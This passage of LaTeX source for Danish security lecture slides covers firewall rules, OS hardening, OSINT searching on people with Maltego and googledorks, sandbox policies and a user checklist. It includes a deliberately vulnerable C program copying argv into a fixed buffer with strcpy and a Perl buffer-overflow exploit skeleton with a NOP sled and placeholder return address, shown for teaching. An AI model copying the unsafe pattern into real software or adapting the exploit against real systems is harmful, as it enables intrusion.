   \item Grafisk brugergrænseflade til konfiguration - er det en
   fordel?
\item TCP/IP filtermuligheder - pakkernes afsender, modtager, retning
  ind/ud, porte, protokol, ...
\item kun IPv4 for de kommercielle firewalls
\item både IPv4 og IPv6 for Open Source firewalls: IPF, OpenBSD PF,
  Linux firewalls, ...
\item foruddefinerede regler/eksempler - er det godt hvis det er nemt
  at tilføje/åbne en usikker protokol?
\item typisk NAT funktionalitet indbygget
\item typisk mulighed for nogle serverfunktioner: kan agere
  DHCP-server, DNS caching server og lignende
  \end{list2}
\item En router med Access Control Lists - ACL kaldes ofte
  netværksfilter, mens en dedikeret maskine kaldes firewall -
  funktionen er reelt den samme - der filtreres trafik
\end{itemize}

\slide{firewall regelsæt eksempel}

\begin{alltt}
\tiny 
# hosts
router="217.157.20.129"
webserver="217.157.20.131"
# Networks
homenet="{ 192.168.1.0/24, 1.2.3.4/24 }"
wlan="10.0.42.0/24"
wireless=wi0

# things not used
spoofed="{ 127.0.0.0/8, 172.16.0.0/12, 10.0.0.0/16, 255.255.255.255/32 }"

block in all # default block anything
# loopback and other interface rules
pass out quick on lo0 all
pass in quick on lo0 all

# egress and ingress filtering - disallow spoofing, and drop spoofed
block in quick from $spoofed to any
block out quick from any to $spoofed

pass in on $wireless proto tcp from $wlan to any port = 22
pass in on $wireless proto tcp from $homenet to any port = 22
pass in on $wireless proto tcp from any to $webserver port = 80

pass out quick proto tcp  from $homenet to any flags S/S keep state
pass out quick proto udp  from $homenet to any         keep state
pass out quick proto icmp from $homenet to any         keep state
\end{alltt}
%$


\slide{netdesign - med firewalls - 100\% sikkerhed?}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/kut.jpg}}  
\end{center}

\begin{list1}
\item Hvor skal en firewall placeres for at gøre størst nytte?
\item Hvad er forudsætningen for at en firewall virker?\\
At der er konfigureret et sæt fornuftige regler!
\item Hvor kommer reglerne fra? Sikkerhedspolitikken!
%\item Kan man lave en 100\% sikker firewall? Ja selvfølgelig, se!
\end{list1}


\centerline{\small Kilde: Billedet er fra Marcus Ranum The ULTIMATELY
  Secure Firewall} 



\slide{Enhance and secure runtime environment}

%\hlkimage{10cm}{Bartizan.png}
\hlkimage{20cm}{medieval-clipart-5}
%\centerline{Picture from: http://karenswhimsy.com/public-domain-images}

\centerline{Sidste chance er på afviklingstidspunktet}

\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\end{list2}
\item Vælg derfor hellere:
\begin{list2}
\item Windows 7, end Windows Xp
\item Mac OS X 10.7 fremfor 10.6
\item Linux sikkerhedsopdateringer, sig ja når de kommer
\end{list2}
\item Det samme gælder for serveroperativsystemer
\item NB: meget få embedded systemer har beskyttelse!
\end{list1}




\slide{Flashback}

\hlkimage{18cm}{flash-security-2011}
Kilde: \link{http://www.locklizard.com/adobe-flash-security.htm}

\slide{Client side: Flash, PDF, Facebook}

\hlkimage{26cm}{drive-by-download-wikipedia.png}

\vskip 1cm
\centerline{Kan vi undvære Flash og PDF?}

Kilde: \link{http://en.wikipedia.org/wiki/Drive-by_download}


\slide{Flash blockers}

\hlkimage{6cm}{clicktoflash.png}

\begin{list1}
\item Safari \link{http://clicktoflash.com/}
\item Firefox Extension Flashblock
\item Chrome extension called FlashBlock
\item Internet Explorer 8: IE has the Flash block functionality built-in so you don't need to install any additional plugins to be able to block flash on IE 8.
\item FlashBlock for Opera 9 - bruger nogen Opera mere?
\item FlashBlockere til iPad? iPhone? Android? - hvorfor er det ikke default?
\end{list1}






\slide{POP3 i Danmark - trådløst}

\hlkimage{13cm}{images/pop3-wlan.pdf}
\begin{list1}
\item Har man tillid til andre ISP'er? Alle ISP'er?
\item Deler man et netværksmedium med andre?
\item {\color{green}Brug de rigtige protokoller!}
\end{list1}



\slide{Wall of sheep}

\hlkimage{16cm}{wall-of-sheep-defcon.jpg}

\begin{center}
Defcon Wall of Sheep\\
Husk nu at vi er venner her! - idag er det kun teknikken
\end{center}




% Mere avanceret, eller bare god fornuft?

\slide{Twitter news}

%\hlkimage{18cm}{twitter-security-feed.png}
\hlkimage{10cm}{twitter-safety.png}

\begin{list1}
\item Twitter has become an important new ressource for lots of stuff
\item Twitter has replaced RSS for me 
\end{list1}



\slide{Single user mode boot}
\begin{list1}
\item Unix systemer tillader ofte boot i singleuser mode\\
hold command-s nede under boot af Mac OS X 
\item Bærbare tillader typisk boot fra CD-ROM\\
hold c nede på en Mac 
\item Mac computere kan i nogle tilfælde være firewire diske\\
hold t nede under boot
\item Harddisken kan typisk nemt fjernes fra en bærbar
\end{list1}
\pause
\centerline{Fysisk adgang til systemet - {\bf game over}}


\slide{Mac OS X} 

\hlkimage{16cm}{macbook-black.jpg}

\centerline{Firewire target mode: Macbook disken kan tilgås fra en anden Mac}

Press t to enter \smiley\\
\link{http://support.apple.com/kb/ht1661}








\slide{Hackertyper anno 1995}

\hlkimage{10cm}{hackers_JOLIE+1995.jpg}

\centerline{Lad os lige gå tilbage til hackerne}

\slide{Hackertyper anno 2008}
\hlkimage{10cm}{lisbeth-salander.jpeg}

\begin{list1}
\item Lisbeth laver PU, personundersøgelser ved hjælp af hacking
\item Hvordan finder man information om andre
\end{list1}

\slide{Fra mønstre til person}

\begin{list1}
\item Først vil vi finde nogle mønstre
\item Derefter vil vi søge med de mønstre
\item Nogle giver direkte information
\item Andre giver baggrundsinformation
\item Hvad er offentligt og hvad er privat? (googledorks!)
\end{list1}

\slide{Eksempler på mønstre}

\begin{list1}
\item Navn, fulde navn, fornavne, efternavne, alias'es
\item Diverse idnumre, som CPR - tør du søge på dit CPR nr?
\item Computerrelaterede informationer: IP, Whois, Handles
\item Øgenavne, kendenavne
\item Skrivestil, ordbrug mv.
\item Tiden på din computer?
\item Tænk kreativt \smiley
\end{list1}


\slide{Hvor finder du informationerne}

\begin{list1}
\item Email
\item DNS
\item Gætter
\item Google
\item Alt hvad du ellers har adgang til - eller som Lisbeth tilraner sig adgang til
\end{list1}

\slide{whois systemet}

\begin{list1}
\item IP adresserne administreres i dagligdagen af et antal Internet
  registries, hvor de største er:
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address Registry) - Latin America and some Caribbean Islands
\end{list2}
\item disse fire kaldes for Regional Internet Registries (RIRs) i
  modsætning til Local Internet Registries (LIRs) og National Internet
  Registry (NIR) 
\end{list1}

\slide{Google for it}

\hlkimage{18cm}{images/googledorks-1.pdf}

\begin{list1}
\item Google som hacker værktøj?
\item Googledorks
\link{http://johnny.ihackstuff.com/}
\end{list1}


\slide{Listbeth in a box?}

\hlkimage{17cm}{maltego-1.png}

%\hlkimage{17cm}{Paterva_network_small.png}
BT4 udgaven, kommerciel udgave på \link{http://www.paterva.com/maltego/}

\slide{Demo Maltego}



\slide{Er du passende paranoid?}

\hlkimage{15cm}{MangaRamblo.jpg}

\centerline{Vær på vagt}

\slide{Hvordan bliver du sikker} 

\begin{list1}
\item Lad være med at bruge computere
\item Lad være med at bruge een computer til alt - en privat bærbar ER mere privat end en firmacomputer
\item Forskellige computere til forskellige formål, en server er mail-server en anden er web-server
\item Brug en sikker konfiguration, minimumskonfiguration
\item Brug sikre protokoller, kryptering, evt. TOR
\item Opsætning af netværk, hvordan? Security Configuration Guides + paranoia
\begin{list2}
\item \link{http://csrc.nist.gov/publications/PubsSPs.html}
\item \link{http://www.nsa.gov/research/publications/index.shtml}
\item \link{http://www.nsa.gov/ia/guidance/security_configuration_guides/index.shtml}
\end{list2}
\end{list1}







\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}


\slide{Buffer og stacks}

\hlkimage{20cm}{buffer-overflow-1.pdf}

\begin{alltt}
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]); 
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}


\slide{Overflow - segmentation fault }

\hlkimage{20cm}{buffer-overflow-2.pdf}


\begin{list1}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list1}


\slide{Exploits}

\vskip 1 cm

\begin{alltt}
$buffer = ""; 
$null = "\textbackslash{}x00"; \pause
$nop = "\textbackslash{}x90"; 
$nopsize = 1; \pause
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0xdeadbeef; // address where shellcode is 
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}\pause
$address = pack('l', $the_shell_pointer);
$buffer .= $address;\pause
exec "$program", "$buffer";
\end{alltt}
\vskip 1 cm
\centerline{Demo exploit in Perl}

\slide{Hvordan finder man buffer overflow, og andre fejl}

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source betyder man kan læse og analysere koden 
\item Source code review - automatisk eller manuelt
\item Fejl kan findes ved at prøve sig frem - fuzzing
\item Exploits virker typisk mod specifikke versioner af software
\end{list1}

\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{20cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}

\slide{Metasploit}

\hlkimage{20cm}{metasploit-about.png}

\begin{list1}
\item Idag findes der samlinger af exploits som exploit-db eller exploit packs
\item Udviklingsværktøjerne til exploits er idag meget raffinerede!
\item \link{http://www.metasploit.com/}
\item \link{http://www.fastandeasyhacking.com/} Armitage GUI til Metasploit
\item \link{http://www.offensive-security.com/metasploit-unleashed/}
\end{list1}

\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Kan du bryde kæden af forudsætninger har du vundet!
\end{list1}

\slide{Eksempler på forudsætninger}


\begin{list1}
\item Computeren skal være tændt
\item Funktionen der misbruges skal være slået til
\item Executable stack
\item Executable heap
\item Fejl i programmet
\end{list1}
\pause
\vskip 2cm 

\centerline{\color{solido-orange}\LARGE \bf alle programmer har fejl}

\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\end{list2}
\item Vælg derfor hellere:
\begin{list2}
\item Windows 7, end Windows Xp
\item Mac OS X 10.7 fremfor 10.6
\item Linux sikkerhedsopdateringer, sig ja når de kommer
\end{list2}
\item Det samme gælder for serveroperativsystemer
\item NB: meget få embedded systemer har beskyttelse!
\end{list1}

\slide{Enhance and secure runtime environment}

%\hlkimage{10cm}{Bartizan.png}
\hlkimage{20cm}{medieval-clipart-5}
%\centerline{Picture from: http://karenswhimsy.com/public-domain-images}

\centerline{Sidste chance er på afviklingstidspunktet}

\slide{Defense in depth - flere lag af sikkerhed}

\hlkimage{8cm}{security-layers-1.pdf}

\centerline{\hlkbig\color{solido-orange} Forsvar dig selv med flere lag af sikkerhed! }



\slide{Chroot, Jails and }

\begin{list1}
\item Der findes mange typer \emph{jails} på Unix
\item Ideer fra Unix chroot som ikke er en egentlig sikkerhedsfeature
\begin{list2}
\item Unix chroot - bruges stadig, ofte i daemoner som OpenSSH
\item FreeBSD Jails
\item SELinux
\item Solaris Containers og Zones - \emph{jails på steroider}
\item VMware virtuelle maskiner, er det et jail?
\end{list2}
\item Hertil kommer et antal andre måder at adskille processer - sandkasser
\item Husk også de simple, database som \verb+_postgresql+, Tomcat som \verb+tomcat+, Postfix postsystem som \verb+_postfix+, SSHD som \verb+sshd+ osv. - simple brugere, få rettigheder
\end{list1}


\slide{OpenBSD systrace}

systrace - generate and enforce system call policies
\begin{alltt}\small
EXAMPLES
   An excerpt from a sample ls(1) policy might look as follows:
     Policy: /bin/ls, Emulation: native
     [...]
        native-fsread: filename eq "$HOME" then permit
        native-fchdir: permit
     [...]
        native-fsread: filename eq "/tmp" then permit
        native-stat: permit
        native-fsread: filename match "$HOME/*" then permit
        native-fsread: filename eq "/etc/pwd.db" then permit
     [...]
        native-fsread: filename eq "/etc" then deny[eperm], if group != wheel

SEE ALSO
     systrace(4)
\end{alltt}

\slide{Apache 6.0.18 catalina.policy (uddrag) - Java JVM}

\begin{alltt}\footnotesize
// ========== WEB APPLICATION PERMISSIONS =====================================
// These permissions are granted by default to all web applications
// In addition, a web application will be given a read FilePermission
// and JndiPermission for all files and directories in its document root.
grant \{ 
    // Required for JNDI lookup of named JDBC DataSource's and
    // javamail named MimePart DataSource used to send mail
    permission java.util.PropertyPermission "java.home", "read";
    permission java.util.PropertyPermission "java.naming.*", "read";
    permission java.util.PropertyPermission "javax.sql.*", "read";
...
\};
// The permission granted to your JDBC driver
// grant codeBase "jar:file:${catalina.home}/webapps/examples/WEB-INF/lib/driver.jar!/-" \{
//      permission java.net.SocketPermission "dbhost.mycompany.com:5432", "connect";
// \};
\end{alltt}

\begin{list1}
\item Eksempel fra \verb+apache-tomcat-6.0.18/conf/catalina.policy+
\end{list1}



\slide{Apple sandbox named generic rules} 

\begin{alltt}\small 
;; named - sandbox profile
;; Copyright (c) 2006-2007 Apple Inc.  All Rights reserved.
;;
;; WARNING: The sandbox rules in this file currently constitute 
;; Apple System Private Interface and are subject to change at any time and
;; without notice. The contents of this file are also auto-generated and not
;; user editable; it may be overwritten at any time.
;;
(version 1)
(debug deny)

(import "bsd.sb")

(deny default)
(allow process*)
(deny signal)
(allow sysctl-read)
(allow network*)
\end{alltt}


\slide{Apple sandbox named specific rules } 

\vskip 2cm
\begin{alltt}\small 
;; Allow named-specific files
(allow file-write* file-read-data file-read-metadata
  (regex "^(/private)?/var/run/named\textbackslash\textbackslash.pid$"
         "^/Library/Logs/named\textbackslash\textbackslash.log$"))

(allow file-read-data file-read-metadata
  (regex "^(/private)?/etc/rndc\textbackslash\textbackslash.key$"
         "^(/private)?/etc/resolv\textbackslash\textbackslash.conf$"
         "^(/private)?/etc/named\textbackslash\textbackslash.conf$"
         "^(/private)?/var/named/"))
\end{alltt}

\begin{list1}
\item Eksempel fra \verb+/usr/share/sandbox+ på Mac OS X
\end{list1}



\slide{Flashback}

\hlkimage{18cm}{flash-security-2011}
Kilde: \link{http://www.locklizard.com/adobe-flash-security.htm}

\slide{Client side: Flash, PDF, Facebook}

\hlkimage{26cm}{drive-by-download-wikipedia.png}

\vskip 1cm
\centerline{Kan vi undvære Java, Flash og PDF?}

Kilde: \link{http://en.wikipedia.org/wiki/Drive-by_download}


\slide{Flash blockers}

\hlkimage{6cm}{clicktoflash.png}

\begin{list1}
\item Safari \link{http://clicktoflash.com/}
\item Firefox Extension Flashblock
\item Chrome extension called FlashBlock
\item Internet Explorer 8: IE has the Flash block functionality built-in so you don't need to install any additional plugins to be able to block flash on IE 8.
\item FlashBlock for Opera 9 - bruger nogen Opera mere?
\item FlashBlockere til iPad? iPhone? Android? - hvorfor er det ikke default?
\end{list1}













\slide{Er du passende paranoid?}

\hlkimage{15cm}{MangaRamblo.jpg}

\centerline{Vær på vagt}

\slide{Hvordan bliver du sikker} 

\begin{list1}
\item Lad være med at bruge computere :-)
\item Lad være med at bruge een computer til alt - en privat bærbar ER mere privat end en firmacomputer
\item Forskellige computere til forskellige formål, en server er mail-server en anden er web-server
\item Brug en sikker konfiguration, minimumskonfiguration
\item Brug sikre protokoller, kryptering, evt. TOR
\item Opsætning af netværk, hvordan? Security Configuration Guides + paranoia
\begin{list2}
\item \link{http://csrc.nist.gov/publications/PubsSPs.html}
\item \link{http://www.nsa.gov/research/publications/index.shtml}
\item \link{http://www.nsa.gov/ia/guidance/security_configuration_guides/index.shtml}
\end{list2}
\end{list1}



\slide{Følg med Twitter news}

%\hlkimage{18cm}{twitter-security-feed.png}
\hlkimage{10cm}{twitter-safety.png}

\begin{list1}
\item Twitter has become an important new resource for lots of stuff
\item Twitter has replaced RSS for me 
\end{list1}

\slide{Følg med Twitter news}

\hlkimage{18cm}{twitter-security-feed.png}

Exploits og nye sårbarheder



\slide{Checklisten}

\begin{list2}
\item BIOS kodeord, pin-kode til telefon 
\item Firewall - specielt på laptops
\item Installer anti-virus og anti-spyware hvis det er på Windows
\item Brug to browsere med forskellige indstillinger
\item Brug evt. PGP til mailkryptering
\item Brug Password Safe, Keychain Access (OSX) eller tilsvarende
\item Overvej at bruge harddisk eller filkryptering
\item Opdatere alle programmer jævnligt 
\item {\bf Backup af vigtige data - harddiske i bærbare kan også dø}
\item Husk: sikker sletning af harddiske, medier osv.
\end{list2}

\slide{Afbalanceret sikkerhed}

\hlkimage{21cm}{afbalanceret-sikkerhed.pdf}

\begin{list1}
\item Det er bedre at have et ensartet niveau
\item Hvor rammer angreb hvis du har Fort Knox et sted og kaos andre steder
\item Hackere vælger ikke med vilje den sværeste vej ind
\end{list1}


\slide{For lidt samarbejde}

\hlkimage{18cm}{Shaking-hands_web.jpg}

\begin{list1}
\item Team up!
\item Snak med din sidemand/dame - I har sikkert mange af de samme udfordringer.
\end{list1}


\slide{PROSA CTF}

\hlkimage{10cm}{DSCF3910s.jpg}

\begin{list1}
\item PROSA afholdt fredag 17. september - til lørdag 18. september Capture the Flag 
\item Distribueret CTF med 6 hold og arrangørerne i Aalborg
\item Sjovt og lærerigt - gentages helt sikkert
\end{list1}
Kilde: \link{http://prosa-ctf.the-playground.dk/}

\centerline{Get ready! Lær debuggere, perl, java at kende, start på at hacke}


\slide{Fri adgang til hackerværktøjer}

\begin{list1}
\item I 1993 skrev Dan Farmer og Wietse Venema artiklen\\
\emph{Improving the Security of Your Site by Breaking Into it}
\item I 1995 udgav de softwarepakken SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\begin{quote}\large
We realize that SATAN is a two-edged sword - like many tools,\\
it can be used for good and for evil purposes. We also \\
realize that intruders (including wannabees) have much \\
more capable (read intrusive) tools than offered with SATAN. 
\end{quote}
\item Se \link{http://sectools.org} og \link{http://www.packetstormsecurity.org/}

\end{list1}
Kilde:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}








\slide{Spørgsmål?}


\vskip 4cm

\begin{center}
\hlkbig 

\myname

\myweb
\vskip 2 cm

I er altid velkomne til at sende spørgsmål på e-mail
\end{center}


\slide{VikingScan.org - free portscanning}

\hlkimage{18cm}{vikingscan.png}
%\vskip 1cm 
%\centerline{\link{http://www.vikingscan.org}}


\end{document}
\input{references.tex}

